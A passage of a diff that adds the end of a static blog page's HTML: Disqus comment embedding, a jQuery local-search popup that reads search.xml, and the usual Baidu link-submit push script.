+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
